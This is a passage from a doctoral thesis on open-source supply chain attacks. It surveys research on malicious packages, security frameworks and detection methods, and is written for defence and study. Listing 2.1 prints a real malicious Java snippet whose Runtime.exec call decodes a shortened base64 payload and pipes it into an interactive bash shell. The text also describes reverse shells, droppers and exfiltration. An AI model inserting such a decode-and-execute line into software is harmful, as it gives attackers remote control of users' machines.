formalize the key stakeholders and systems within the open-source software supply chain, although their main focus is on package managers for interpreted languages like Python, JavaScript, and Ruby. Their work involves the development of a framework for assessing both functional and security aspects of these package managers. In addition, they provide insights into the various stakeholders involved in these package manager ecosystems and outline the relationships among them. They identify as stakeholders _registry maintainers_ , _package maintainers_ , _developers_ , and _end-users_ . 

To delineate the various methods attackers employ to inject malicious code into the dependency tree of a downstream project, Ohm et al. [27] undertake a manual examination of a dataset containing malicious packages sourced from various package repositories, including npm, PyPI, and Gems. They systematically articulate the various strategies utilized for conducting such injections, which can be referred to as _attack vectors_ . In their analysis, they draw upon the foundational graph presented by Pfretzschner et al. [33] and leverage the semantic constructs of attack trees. 

From a high-level perspective, attackers can pursue one of two primary approaches: they can either _create a new package_ or _infect an existing package_ . In the case of creating a new package, attackers may advertise a package with seemingly benign functionalities to camouflage malicious features (i.e., a trojan horse), or they can deploy a malicious package with a name resembling that of a legitimate project (i.e., typosquatting). 

When infecting an existing package, the injection can occur directly into the source code, during the build process of a package, or by targeting repository system (i.e., the distribution platform discussed in Chapter 1.1). Over the years, academia has increasingly delved into the security aspects associated with individual components of the software supply chain, including VCS, build systems, and package repositories. 

In the context of **Version Control System** , Gonzalez et al. [34] focus on attacks that aim to inject malicious code in open-source source code repositories via commits. Their analysis to counter this threat through a rule-based anomaly detection system offers a valuable perspective of the attack surface in the context of VCS. 

Boucher et al. [35] introduce a noteworthy attack vector that leverages rendering issues associated with Unicode bi-directional characters and homoglyphs. This vector allows for the injection and concealment of vulnerabilities in source code. 

In their controversial work, Wu et al. [36] illustrate how vulnerabilities can be inserted into source code bases by concealing the injection within seemingly benign patch fixes. These vulnerabilities can be surreptitiously introduced when a project’s source code al- 

27 

Chapter 2 – _State of the Art_ 

ready possesses most of the prerequisites for exploitability. The _hypocrite_ patch fix then adds the remaining conditions needed to render the latent vulnerability fully exploitable. 

Delving into collaborative development within the open-source community, Goyal et al. [37] emphasize the challenge of information overload that can cause project maintainers to overlook critical details. To address this issue, they propose an anomaly detection approach aimed at flagging unusual commits on GitHub. This system assists project maintainers during the review process by highlighting potentially noteworthy contributions. 

Examining the vulnerability of source code repositories to the injection of malicious content, La Cholter et al. [38] explore the presence of malware files in Windows C/C++ repositories. In their analysis of 24,395 files, they uncover 440 instances of malignancy, with 27 of these malicious files residing within ostensibly benign repositories. 

In the context of **build systems** , Wheeler [39] addresses the issue originally raised by Ken Thompson [16] concerning untrusted compilers potentially injecting malicious code during the compilation process. In response to this concern, Wheeler introduces the Diverse Double-Compiling (DDC) technique. This approach involves compiling the source code of a compiler twice, using a trusted compiler for the comparison. The resulting binaries from the two compilations are then compared bit-by-bit to detect any discrepancies or potential tampering in the compiler under scrutiny. 

A more generalized concept derived from the DDC technique is known as _reproducible builds_ , a concept formalized by Lamb et al. [40]. The primary objective of reproducible builds is to ascertain whether a specific binary corresponds to the original source code and whether its integrity is maintained consistently throughout the entire build process. 

Vu et al. [41] conducted a study focused on verifying the integrity of built artifacts in the context of Python projects. They analyzed and compared Python code within a project’s VCS with the code distributed in the project’s artifacts. This analysis aimed to identify any discrepancies or differences between the two, which could potentially indicate tampering or unauthorized modifications to the artifacts. Scalco et al. [42] perform the same analysis, but in the context of JavaScript. 

Gruhn et al. [43] conduct a security analysis of CI systems. They identify two primary sources of potential malicious data inputs: attacks through the web User Interface (UI) and attacks involving the build process, which includes VCS checkout, build preparations, build execution, and build notifications. To mitigate these risks, they propose a secure build server architecture that relies on Virtual Machines (VMs). This architecture is designed to isolate the various build processes and prevent the spread of infections to other 

28 

_2.1. Understanding Software Supply Chain Attacks_ 

build jobs through shared resources. The concepts of _isolation of the build steps_ and the _usage of dedicated build service_ forms the basis of the so-called _Ephemeral Build Environment_ mentioned in the more recent Supply-chain Levels for Software Artifacts (SLSA) framework [44]. 

Benedetti et al. [45] conducted research into the issue of security misconfigurations in DevOps practices, particularly within GitHub workflows. Their work focused on identifying and addressing these misconfigurations, which have the potential to compromise open-source projects. 

In the context of **package managers and repositories** , Cappos et al. [21], [46] conducted a comprehensive analysis of the security posture of package repositories. Their work focused on identifying potential attack vectors stemming from inadequate signature management at both the package and related metadata levels. 

Torres-Arias et al. [47] introduced the in-toto framework, founded on the principles of delegations and roles. This framework is designed to cryptographically ensure the integrity of software supply chains by enabling end-to-end verification of each step and the involved actors. 

Samuel et al. [48] proposed The Update Framework (TUF) as a solution to address some of the limitations of in-toto. Their focus was primarily on enhancing secure distribution and improving mechanisms for key revocation and replacement. 

Zimmerman et al. [23] carried out an extensive analysis of security threats and associated risks within the npm ecosystem. They introduced several metrics to describe the downstream reach of packages and maintainers, facilitating the identification of critical elements. Additionally, their work involved quantifying the number of implicitly trusted upstream packages and maintainers. Bagmar et al. [49] conducted a similar study within the PyPI ecosystem, expanding the understanding of security concerns in different opensource environments. 

Zahan et al. [32] focused their research on npm, identifying six security weakness signals relevant to software supply chain attacks. Their work involved large-scale package analysis to quantify these signals and included a survey of 470 package developers to assess their significance. 

Wyss et al. [50] delved into the potential exploitation of install-time features within npm by potential attackers, which could lead to OSS supply chain attacks. They proposed a permission-based solution to mitigate such attacks. In a similar fashion, also Ohm et al. [51] propose a runtime protection against install-time attacks in the context of npm 

29 

Chapter 2 – _State of the Art_ 

ecosystem. 

In terms of comprehending the actual content of malicious open-source packages, the primary analyses of datasets have been conducted by Ohm et al. [27] (for what concerns PyPI, npm, and RubyGems ecosystems) and Guo et al. [52] (in the context of PyPI ecosystem). These analyses show that the main behaviors of malwares in the context of OSS supply chain attacks are the following: 

- _Reverse shell_ [27] or _remote control_ [52]: this type of attack aims to spawn a shell process, redirecting both its input and output through an open socket to the attacker’s machine. This allows the attacker to remotely control the victim’s machine 

- _Droppers_ [27]: this type of attack aims to connect to an attacker-controlled host to download a second-stage payload that is subsequently executed. The remote payload can either be read directly through the connection or temporarily stored in a local file. 

- _Data exfiltration_ [27] or _information stealing_ [52]: this is one of the most common malicious behaviors. It involves reading sensitive files and environmental information, which is then sent to a remote endpoint. 

- _Denial of Service (DoS)_ : DoS attacks are typically achieved through resource exhaustion, such as fork bombs, or by deleting critical system files. 

- _Financial gain_ : attackers aim for financial gain by executing crypto miners on the target system, which utilizes the victim’s resources to mine cryptocurrency for the attacker. 

These behaviors are typically achieved through either command execution, such as via shell commands, or by code execution in the target programming language [27], [52]. In the latter case, attackers take advantage of the APIs and capabilities offered by the language itself to carry out these behaviors. 

Both Ohm et al.[27] and Guo et al.[52] have also contributed insights into the techniques employed by malicious packages to evade detection from security tools. They have observed that attackers use a variety of evasion techniques, which include but are not limited to code obfuscation (e.g., base64 encoding, encryption), the use of second-staged payloads, behavior overlap, indirect imports, image steganography, and sandbox escape methods. 

30 

_2.2. Preventing Software Supply Chain Attacks through the Detection of Malicious Packages_ 

## **2.2 Preventing Software Supply Chain Attacks through the Detection of Malicious Packages** 

As the protection of the software supply chain becomes increasingly crucial and the frequency of attacks on the software supply chain rises, both academia and industry have responded with proposals for preventing such attacks. 

## **2.2.1 Software Supply Chain Security Frameworks** 

Several frameworks have been introduced to establish best practices for securing the software development lifecycle. 

The Enduring Security Framework [53], led by a public-private cross-sectional working group involving the NSA, CISA, and ODNI, has provided actionable guidance to developers, suppliers, and customers for enhancing security throughout the software supply chain. "Securing the Software Supply Chain for Developers" addresses the software development lifecycle and assesses threats related to secure code development, third-party component verification, build system hardening, and code delivery. It offers recommended mitigation strategies. "Securing the Software Supply Chain for Suppliers" focuses on how software vendors can identify threats that may compromise their organization, software development processes, software products, and software delivery. "Securing the Software Supply Chain for Customers" outlines best practices for acquiring, deploying, and operating software products. 

The Microsoft OSS Secure Supply Chain Consumption Framework (S2C2F) [54] is a comprehensive framework designed to mitigate risks associated with open-source software consumption. This framework is founded on three fundamental principles: complete control over all utilized open-source software, the utilization of a maturity model for prioritizing implementation requirements, and ensuring the security of the software supply chain on a large scale. In comparison to the "Securing the Software Supply Chain for Developers" framework, the S2C2F places specific emphasis on secure open-source software consumption, offering detailed guidance in this domain. It outlines eight key practices (e.g., scanning and updating third-party components) along with associated operational requirements (e.g., malware scanning of open-source software, security reviews of open-source software). Furthermore, it includes a maturity model that categorizes the requirements into four distinct levels and provides a list of tools that can facilitate the 

31 

Chapter 2 – _State of the Art_ 

fulfillment of these requirements. 

The OWASP Software Component Verification Standard (SCVS) [55] aims to create a framework for identifying activities, controls, and best practices that aid in the recognition and reduction of risks in a software supply chain. Like the S2C2F, OWASP SCVS delineates six control families (e.g., inventory, pedigree, and provenance) and three verification levels, each demanding an increasing number of requirements for higher assurance. Nevertheless, the OWASP SCVS applies to software components in general, and its requirements are not exclusively tailored to open-source software consumed within the supply chain, as is the case with the S2C2F framework. 

The SLSA [44], an OpenSSF project, offers a checklist of standards and controls to safeguard against tampering, enhance integrity, and secure packages and infrastructure within projects, businesses, or enterprises. The SLSA establishes four assurance levels, ranging from basic provenance information to documented, automated build processes, and high confidence and trust, achieved through peer-reviewed source code changes with hermetic, reproducible builds. Compared to the Microsoft S2C2F and OWASP SCVS, the SLSA maintains a narrower focus by concentrating on ensuring integrity, which guarantees that the consumed code has not been tampered with. 

The various frameworks do exhibit some degree of overlap, primarily in their shared objective of offering guidance and recommendations. Efforts have been made to establish connections between these frameworks. For instance, the S2C2F framework integrates a mapping of its requirements to other pertinent specifications, encompassing OWASP SCVS and SLSA. Nevertheless, a common shortcoming across all these frameworks is the absence of a systematic representation of potential attack vectors. This absence hinders the precise definition of the threats covered by the recommendations they provide. Furthermore, even the MITRE ATT&CK framework [56], which is a widely used and comprehensive resource for detailing attack techniques, lacks an extensive description of software supply chain attacks. Within the MITRE ATT&CK framework, techniques like "Compromise Software Dependencies and Development Tools (T1195.001)" [57] and "Compromise Software Supply Chain (T1195.002)" [58] are categorized under the Initial Access (TA0001) tactic. However, these techniques are not extensively elaborated upon within the framework, leaving room for a more detailed examination of software supply chain attacks. 

For what concerns academic research, most of the works presented in Section 2.1(i.e., [21], [34], [37], [39]–[43], [45], [46], [48], [50], [51]) not only contribute to a greater under- 

32 

_2.2. Preventing Software Supply Chain Attacks through the Detection of Malicious Packages_ 

standing of software supply chain attacks but also propose several countermeasures. 

In this thesis, we focus on preventive measures rooted in the detection of malicious code within open-source packages. In fact, these packages represent the ultimate output of the open-source software supply chain, subsequently consumed by end-users downstream. Consequently, although malicious code injections can occur at any stage (i.e., in source, during build, in distribution channels), the critical concern for users of open-source projects is the actual content they consume. 

## **2.2.2 State of the Art on the Detection of Malicious Packages** 

Classical malware analysis has traditionally focused on binaries [59]. One possible explanation for this focus is the belief that having access to the source code simplifies the task of identifying the presence of malicious code. However, OSS supply chain attacks have demonstrated that this is not necessarily the case. In fact, given the vast volume of code that would need to be reviewed to detect the presence of malicious code, including both direct and indirect dependencies, such a task is practically unfeasible. 

As demonstrated by multiple examples of malicious OSS packages, such as those discussed in Ohm et al.[27], these packages often contain a small fraction of harmful code hidden within a larger body of legitimate code. 

In Listing 8.1, we can observe a malicious code snippet found in the package `com.github. codingandcoding:servlet-api@3.2.0` . The source version of this package consists of 149 files, with 77 of them in Java format, totaling 13,458 Lines Of Code (LOC). Remarkably, the malicious payload is present in just one line of code within the file `HttpServlet.java` , which itself consists of 749 LOC. 

– Listing 2.1 Malicious code snippet from `HttpServlet.java` contained in `com.github.codingandcoding:servlet-api@3.2.0` 

1 `protected void doGet( HttpServletRequest req)` 

2 `throws ServletException , IOException {` 3 `Runtime.getRuntime ()` 4 `.exec( "bash -c {echo ,YmFz ** SHORTENED **JjE=}` 5 `|{base64 ,-d}|{bash ,-i}" );` 6 `}` 

33 

Chapter 2 – _State of the Art_ 

To evaluate the performance of common Antivirus (AV) solutions in detecting malicious packages within the context of OSS supply chain attacks, we submitted all the available samples in the Backstabber’s Knife Collection (BKC) up to July 2022 to VirusTotal (VT). The BKC [60] is a collection of malicious OSS packages that have been distributed through popular package repositories in real-world attacks. These samples are gathered manually and are contributed voluntarily by members of the community. As of July 2022, the BKC contains a total of 2886 samples from different ecosystems: 813 in Ruby, 261 in Python, 1807 in JavaScript, and 4 in Java. 

|**Ecosystem**<br>RubyGems<br>PyPI<br>npm<br>Maven Central|**Type of Responses**<br>**U**<br>**M**<br>**TU**<br>**F**<br>**T**|
|---|---|
||60.4%<br>17.6%<br>21.1%<br>0.3%<br>0.6%<br>76.0%<br>2.0%<br>21.3%<br>0.2%<br>0.5%<br>77.1%<br>0.7%<br>21.3%<br>0.3%<br>0.5%<br>78.9%<br>3.0%<br>16.7%<br>0.3%<br>1.0%|



– Table 2.1 AV scan results for malicious samples, per ecosystem. **U** : undetected, **M** : malicious, **TU** : type unsupported, **F** : failure, **T** : timeout. 

VT provides scan results with approximately 70 AV software solutions for submitted files [61], [62]. When requesting a scan for a file, the response includes information about the number of AV software that respond in the following ways: not detecting the sample ( **U** ), classifying it as malicious ( **M** ), not supporting the file ( **TU** ), failing during the analysis ( **F** ), or reaching a timeout during the analysis ( **T** ). Table 2.1 presents the average scan results (as percentages) for the files in the BKC 

Among the ecosystems, Ruby has the highest percentage of AV softwares that correctly recognize malicious packages. This could be due in part to the fact that many of these samples originate from the same campaign, containing similar malicious content. 

In general, we observe a low percentage of packages being classified as malicious, particularly in the case of Java, where only 3% of the AV softwares classify the samples as malicious. 

Considering the reporting year of the packages that were not flagged as malicious by any AV, we find that 278 malicious packages were reported more than two years ago, and 45 are older than 5 years, yet they remain undetected by AV softwares. It is challenging to determine the exact reasons behind this low detection rate (e.g., absence of signatures 

34 

_2.2. Preventing Software Supply Chain Attacks through the Detection of Malicious Packages_ 

in AV databases), as the internal methodologies of most AV software are not publicly disclosed. 

The complexity of detecting malicious code, even within source code, coupled with the current detection capabilities of commercial solutions, highlights the necessity of exploring new mechanisms to facilitate the automatic and more effective detection of malicious packages. 

In the following, we delve into research related to the detection of malicious packages as a proactive approach to protect the open-source software supply chain against from potential attacks. To structure this exploration, we draw upon the categorization established by Ohm et al. [63], who systematically examine the existing body of knowledge (from 2017 until 2022) by scrutinizing scholarly works focusing on the detection of malicious packages. In this analysis, we include additional works in this domain until October 2023, and Table 2.2 presents a summary of the described works. 

## **Rules and Heuristics Based Approaches** 

Pfretzschner et al. [33] provide insights into JavaScript language features that malicious dependencies can leverage to execute attacks. They propose a static approach aimed at the automatic classification of such malicious packages. In their analysis, they scrutinize function usage and perform data flow analysis using the T.J. Watson Libraries for Analysis (WALA). 

Čarnogurský [64] introduce Aura, a hybrid static analysis approach for assessing the security of Python packages. In this approach, the source code of Python packages is parsed into an Abstract Syntax Tree (AST). Subsequently, a partial evaluation of the AST is performed, which helps identify and evaluate code segments. These evaluated segments are then compared against predefined semantic rules to determine their compliance with expected behavior. The approach ultimately provides a risk score metric, enabling the assessment of Python packages for potential security risks. 

Duan et al. [22] introduce a pipeline that incorporates metadata, static, and dynamic analysis for detecting malicious packages within interpreted languages such as JavaScript, Python, and Ruby. Their approach involves developing heuristic rules, drawn from the analysis of prior malicious packages associated with supply chain attacks. 

Gonzalez et al. [34] focus on the detection of malicious commits in the context of soft- 

35 

Chapter 2 – _State of the Art_ 

ware repositories. Their approach relies on analyzing commit logs and repository metadata. One notable advantage of their method is that it is language-agnostic, meaning it can be applied to repositories in various programming languages. Additionally, it provides a level of explainability in the alerts it generates, making it easier to understand the nature of potential threats. 

Milje [65] proposes a rule-based system aimed at identifying potentially harmful functions and modules within AST of Python packages. This approach hinges on the idea that frequently used imports or modules in a project are less likely to be malicious. To assess the benign nature of functions, they utilize Term Frequency-Inverse Document Frequency (TF-IDF) to gauge the probability. Additionally, the proposed approach employs a precomputed string-matching technique to identify suspicious strings. Furthermore, Milje applies anomaly detection methods for behavior analysis. The outcomes of this analysis are then aggregated and assigned risk values. If a bulletin’s risk value surpasses a certain threshold, it is included in the final report. 

## **Approaches Targeting Typosquatting** 

Vu et al. [66] leverage the Levenshtein distance with a threshold smaller or equal to two to automatically identify possible typosquatting or combosquatting attacks against popular Python packages. 

Taylor et al. [67] introduce a tool called Spellbound, which is designed to identify typosquatting in package names. Spellbound achieves this by utilizing a model of lexical similarity between package names, which considers factors like the popularity of packages. 

## **Approaches Leveraging Differential Analysis** 

Ohm et al. [68] leverage sandboxes to collect forensic artifacts related to the execution of malicious JavaScript and Python packages and describe the observed dynamic behaviors. 

Vu et al. [41], [69] approach the detection of malicious injections in Python packages by analyzing discrepancies between the source code and the built version. Specifically, they perform two comparisons. First, they compare file hashes. Second, they examine the source code available in the project’s repository and compare it to the related binary artifact available on PyPI. 

Scalco et al. [42] transfer the approach from Vu et al. [41] of analysing discrepancies between the artifacts in the context of JavaScript. 

36 

_2.2. Preventing Software Supply Chain Attacks through the Detection of Malicious Packages_ 

Barr-Smith et al. [70] propose an approach that aims at detecting trojanized binaries in the context of closed-source software supply chain attacks. In particular, they analyze the differences between benign executables and the related infected version to detect the presence of maliciousness, e.g., packing, obfuscation, sensitive API calls or imports. 

Cao et al. [71] concentrate on the automated detection of malicious forks on GitHub that are intended for cryptocurrency mining. Their approach involves checking whether these forks contain malicious executables, malicious capabilities such as packing, or typosquatted dependencies. 

## **Machine Learning Approaches** 

Sejfia et al. [29] propose a supervised learning approach combined with a code reproducer and a simple clone detector for the automated detection of malicious packages in npm. Although they also consider some language-generic features (e.g., presence of minified code, binary files), their main focus is on language-dependent aspects (e.g., use of specific APIs) for JavaScript. 

Ohm et al. [72] conduct an extensive evaluation of 25,210 models to assess the feasibility of utilizing supervised learning techniques for the detection of malicious packages. 

Zhang et al. [73] propose Cerebro to detect malicious packages in npm and PyPI. In particular, they leverage an high-level abstraction of malicious behavior to enable the detection in multiple languages (i.e., Python and JavaScript). The source code is transformed into behavior sequence to then fine-tune the BERT model to understand the semantics of malicious behavior. 

Fass et al. [74] extract features from the AST of JavaScript scripts to build a classifier capable of detecting obfuscation in (potentially) malicious JavaScript files. 

## **Anomaly Detection Approaches** 

Garret et al. [75] propose an anomaly detection approach based on the observation of code features in JavaScript (e.g., opening of connections, read/write to the file system). In particular, they leverage k-means clustering to represent a behavior model for npm package updates and flag as suspicious those packages that fall outside such clusters. 

Liang et al. [76] propose a detection approach that combines static analysis and anomaly detection. Specifically, they analyze a package to determine whether it performs security-sensitive operations or exhibits malicious behavior. Subsequently, they utilize iForest as an unsupervised anomaly detection method to identify potentially suspicious 

37 

Chapter 2 – _State of the Art_ 

or malicious packages. Finally, they apply reverse cross-validation to enhance the detection rate and reduce the false-positive rate. 

Wang et al. [77] propose an approach for detecting software supply chain attacks which is based on the inspection of network packets. In particular, they use inter-packet timingbased flow watermarking to discern between benign data access from malicious activities (i.e., illegal data access). 

## **Clustering Approaches** 

Ohm et al. [78] they propose a clustering model based on unsupervised signature generation relative to code reuse. In particular, they generate the AST from npm packages and cluster them so that they can identify packages sharing commonalities. 

As we also aim at detecting malicious packages in Java, the available related works mostly focus on the detection of malicious code in applets or purely malicious JARs (i.e., containing mostly malicious code). 

Schlumberger et al. [79] propose a static approach for detecting (purely) malicious applets based on machine learning. Among the selected features they consider sensitive APIs (e.g., for obfuscation and code behavior). 

Pinheiro et al. [80] propose a dynamic approach for the automated detection of malicious JARs. They extract forensic features related to the execution of the purely malicious samples in a sandboxed environment to train a classifier based on artificial neural networks. 

Other pertinent works emerge from the Android ecosystem. Indeed, a similarity can be observed between malicious OSS packages and malicious Android applications in that the harmful code is frequently concealed within a larger body of legitimate code. This phenomenon draws a parallel with the concept of _piggybacking_ in Android malware, where a legitimate application (referred to as the _carrier_ ) is repackaged to include malicious code (the _rider_ ) [81]–[83]. In this context, Arshad et al. [84] offer a taxonomy of the primary Android malware detection approaches. The two main categories are static and dynamic approaches. In the context of static approaches, the possible approaches are signaturebased, permission-based, and Dalvik bytecode detection. It is important to note that permission-based approaches are not applicable to OSS supply chain attacks since this concept is exclusively available for Android applications through the Android manifest. In the context of dynamic approaches, the described approaches (i.e., anomaly based, taint analysis, and emulation-based detection) can be applied also to malicious Java packages. 

38 

_2.2. Preventing Software Supply Chain Attacks through the Detection of Malicious Packages_ 

||**Language(s)**|**Static/Dynamic**|**Year**|
|---|---|---|---|
|**Rules and Heuristics**||||
|Pfretzschner et al. [33]|JavaScript|static|2017|
|Čarnogurský [64]|Python|hybrid static|2019|
|Duan et al. [22]|JavaScript, Python, Ruby|both|2020|
|Gonzalez et al. [34]|all|static|2021|
|Milje [65]|Python|static|2022|
|**Typosquatting**||||
|Vu et al. [66]|Python|static|2020|
|Taylor et al. [67]|JavaScript, Python|static|2020|
|**Diferential Analysis**||||
|Ohm et al. [68]|JavaScript|dynamic|2020|
|Vu et al. [41], [69]|Python|static|2021|
|Scalco et al. [42]|JavaScript|static|2022|
|Barr-Smith et al. [70]|n.a. (PE Binaries)|both|2022|
|Cao et al. [71]|n.a. (executables)|static|2022|
|**Machine Learning Approaches**||||
|Sejfa et al. [29]|JavaScript|static|2022|
|Ohm et al. [72]|JavaScript|static|2022|
|Zhang et al. [73]|JavaScript, Python|static|2023|
|Fass et al. [74]|JavaScript|static|2018|
|**Anomaly Detection**||||
|Garret et al. [75]|JavaScript|static|2019|
|Liang et al. [76]|Python|static|2021|
|Wang et al. [77]|n.a. (network packets)|dynamic|2021|
|**Clustering**||||
|Ohm et al. [78]|JavaScript|static|2020|



– Table 2.2 State of the art papers focusing on the detection of software supply chain attacks, following the classification of Ohm et al. [63]. 

39 

Chapter 3 

## **NOVELTY OF THESIS CONTRIBUTIONS** 

The primary aim of this thesis is to enhance the security posture of the OSS supply chain. To accomplish this objective, we first aim to gain an exhaustive understanding of the attackers and their methodologies. Subsequently, once we have identified the technical characteristics of the attacks, our goal is to use these traits to detect malicious behavior in consumed packages before execution. 

**==> picture [454 x 214] intentionally omitted <==**

**----- Start of picture text -----**<br>
ATTACKER<br>1. Make the  2. Make the victim  3. Make the victim<br>malicious OSS  download the  execute the<br>package available malicious OSS  malicious code in<br>package the OSS package<br>DEFENDER<br>Detect malicious package<br>before download or<br>execution<br>**----- End of picture text -----**<br>


– Figure 3.1 Description of the three main steps involved in an OSS supply chain attack (attacker’s side) and the goal of the defender to prevent them. 

As previously highlighted in Chapter 1 and illustrated in Figure 3.1, there are three critical stages in a successful attack. First, the attacker must prepare a malicious package and make it accessible to downstream users. Second, they must convince or manipulate these users into interacting with the malicious package (e.g., such as by installing it). Finally, they have to get the downstream users to execute the malicious code contained in the package. 

41 

Chapter 3 – _Novelty of Thesis Contributions_ 

In terms of **understanding** all the known ways in which attackers perform these three steps, the thesis contributes as follows. 

**Chapter 4** proposes a general taxonomy for attacks on open-source supply chains, independent of specific programming languages or ecosystems, and covering all supply chain stages from code contributions to package distribution. By delving into how attackers manage to inject malicious code into OSS components, this taxonomy aids in understanding the first two attacker’s requirements depicted in Figure 3.1. 

Through the comprehensive compilation of potential, as well as documented, attack vectors, **Chapter 5** identifies corresponding preventative measures. These safeguards, either in full or partial capacity, can effectively mitigate the risks associated with these attack vectors. 

**Chapter 6** complements the taxonomy by investigating how third-party dependencies can achieve ACE by distributing malicious packages to downstream users. Thus, this chapter aim at covering the understanding the third attacker’s requirement depicted in Figure 3.1. 

Gaining a comprehensive understanding of an attacker’s modus operandi within the framework of OSS supply chain attacks, empowers us to design malicious code **detection** strategies rooted in these technical specifics. In fact, this defensive approach can be utilized by either package repositories, to ameliorate the underlying issue and bolster user defense, or by consumers during the download of open-source packages to avert potential infection. Because of the breadth of possible ecosystems, we limit ourselves in this thesis to the exploration of ecosystems related to the Python, JavaScript, and Java languages. 

**Chapter 7** proposes an innovative approach using language-independent features to train models for detecting malicious packages in npm and PyPI, capturing their similarities. This overcomes the challenge of limited sample availability by utilizing a diverse multi-language dataset. Our models were evaluated in a controlled experiment (with known data labels) and a real-world test where we scanned newly uploaded npm and PyPI packages over a 10-day window. The methodology effectively identified malicious packages in both repositories. From an analysis of 31,292 packages, we highlighted 58 unknown malicious packages (38 for npm and 20 for PyPI), which were subsequently removed from the respective repositories. 

**Chapter 8** addresses the detection of pre-compiled Java packages, introducing static indicators representative of malicious behavior, as observed through Java bytecode analysis. We assess these indicators and their combinations against malicious code injections, 

42 

_3.1. Novelty in the Understanding of Software Supply Chain Attacks_ 

employing three real-world malicious payloads (limited to three due to availability). These payloads are inserted into the top 10 most popular Java libraries from libraries.io. Our findings reveal that analyzing strings in the constant pool and sensitive APIs in bytecode instructions significantly aids in detecting harmful Java packages. Importantly, this method reduces information overload, enabling manual triage as well. 

As observed in Chapter 2 (Section 2.1 and Section 2.2), both industry and academia have recently intensified their efforts to enhance software supply chain security, both in a general context and particularly in relation to open-source software. 

In the following sections we delve into the novelty of the contributions made by this thesis within the context of understanding and preventing OSS supply chain attacks. 

## **3.1 Novelty in the Understanding of Software Supply Chain Attacks** 

In particular, in Section 2.1, we observe that there exist multiple academic works that focus on specific threats but there is no work systematizing knowledge to provide a broader description of the whole attack surface of the OSS supply chain. More precisely, we observed that existing works on OSS supply chain security lack a comprehensive, comprehensible, and general description of how attackers inject malicious code into OSS projects, independent of specific programming languages, ecosystems, technologies, and stakeholders. 

We believe that a taxonomy classifying these attacks could provide value to both academia and industry. Such a taxonomy could serve as a common reference, clarify terminology, and support various activities, including developer training, risk assessment, and the development of new safeguards. 

In this thesis, we leverage the attack tree introduced by Ohm et al. [27] as a foundation. However, we have enhanced this approach by imposing a more structured framework that considers the degrees of interference with existing packages, the various supply chain stages, the involvement of different stakeholders, and the intricate network of systems. Furthermore, we rigorously validate our taxonomy through a survey that engages 17 domain experts and 134 developers. 

ENISA [85] offers a taxonomy of supply chain attacks that outlines the techniques employed by attackers and the assets they target, from both supplier and customer viewpoints. However, their taxonomy provides only a limited number of high-level techniques. 

43 

Chapter 3 – _Novelty of Thesis Contributions_ 

The frameworks discussed in Section 2.2 (e.g., S2C2F, SLSA) are essential in improving open-source software security, but they often lack a systematic representation of how attacks are executed. These frameworks primarily focus on providing safeguard recommendations. Our taxonomy focuses on the integrity of open-source software and does not cover threats related to availability (e.g., as in SLSA), the introduction of unintended vulnerabilities, or end-of-support for certain OSS components. We specifically target threats associated with the intentional introduction of malicious code into open-source software packages. 

Our taxonomy takes an attacker’s perspective and offers a comprehensive classification of attacks, thus complementing these frameworks. In contrast, the existing MITRE ATT&CK framework lacks an in-depth description of software supply chain attacks. We aim to expand on its techniques related to compromising software dependencies and the software supply chain (T1195.001 and T1195.002) by providing a more extensive set of attack vectors in our taxonomy. Additionally, the Tactics, Techniques, and Procedures (TTPs) outlined in the MITRE ATT&CK framework can be applied to the attack vectors in our taxonomy related to compromising a system, while techniques related to Credential Access (TA0006) align with the takeover of accounts (e.g., of project maintainers) in our taxonomy. 

The outlined taxonomy describes how attackers inject malicious code into OSS. However, this study does not address the actual malicious content of packages. To complement this, we analyze the various execution and evasion techniques employed by malicious packages. Thus, following the terminology from Okafor et al. [30], our work aims to understand the techniques used by attackers on package managers, in the compromise stage of an OSS supply chain attack. 

We begin by exploring the functionalities of package managers for popular programming languages that allow for code execution at both install-time and runtime. Subsequently, we identify where attackers can conceal malicious code to increase the likelihood of its execution during downstream project build, testing, or runtime operation. Based on the analysis of seven ecosystems, we categorize three install-time techniques and four runtime techniques. 

Compared to Ohm et al. [27], our research extends beyond existing malicious examples by exploring additional potential techniques and conducting a broader analysis across a wide range of programming languages. 

In contrast to the studies conducted by Zimmerman et al.[23] and Bagmar et al.[49], 

44 

_3.2. Novelty in the Prevention of Software Supply Chain Attacks_ 

our work delves into the mechanisms through which dependencies can achieve code execution. We do not limit our investigation to specific package ecosystems, such as npm or PyPI, but also encompass ecosystems exhibiting similar features. Our goal is to provide a comprehensive understanding of security risks across different ecosystems and offer practical, runnable examples. 

As discussed earlier, Duan et al. [22] explore the functionalities of npm, PyPI, and RubyGems. They propose a framework for evaluating both functional and security features and detecting malicious packages through program analysis. While their framework has a wide scope, encompassing aspects like authentication and signing features, our research takes a pragmatic approach, focusing specifically on package manager features that can lead to ACE. Furthermore, we expand our analysis to include other package managers, such as Composer and Cargo. 

Similarly, Wyss et al. [50] investigate the potential exploitation of install-time features in npm by attackers, with a specific focus on the _pre-install_ , _install_ , and _post-install_ hooks. In contrast, our work extends the analysis to identify additional installation hooks provided by npm. Moreover, we explore similar attack vectors in various ecosystems beyond npm, thereby broadening the scope of our research. 

In the exploration of the functionalities of package managers that allow for code execution, we share a focus on package manager security with Zahan et al. [32]. However, we approach the subject from an offensive perspective, delving into how attackers exploit package managers across multiple ecosystems for code execution and studying evasion techniques. 

## **3.2 Novelty in the Prevention of Software Supply Chain Attacks** 

In the realm of preventing attacks on the OSS supply chain, this thesis has delved into the exploration of techniques for detecting malicious OSS packages. 

Specifically, this thesis we evaluates the feasibility of using a machine-learning approach designed to identify commonalities in malicious behaviors across different programming languages, with a primary focus on Python and JavaScript. This entails constructing a _cross-language_ classifier using a dataset featuring samples from both languages, as well as developing two separate _mono-language_ classifiers trained on datasets comprising samples from either JavaScript or Python. 

45 

Chapter 3 – _Novelty of Thesis Contributions_ 

In the context of detecting malicious packages, as discussed in Section 2.2 and categorized following Ohm et al. [63], our work also adopts a machine learning approach and thus we compare with works in this domain. 

While Sejfia et al.[29] do consider some language-agnostic features such as the presence of minified code and binary files, their primary focus remains on language-specific aspects, particularly the utilization of specific APIs in JavaScript. In the case of Ohm et al.[72], they concentrate their research on the npm ecosystem, emphasizing language-specific features, alongside more generalized ones. In contrast, our approach, as compared to that of Sejfia et al.[29] and Ohm et al.[72], centers on language-independent features that can be readily applied to both JavaScript and Python. 

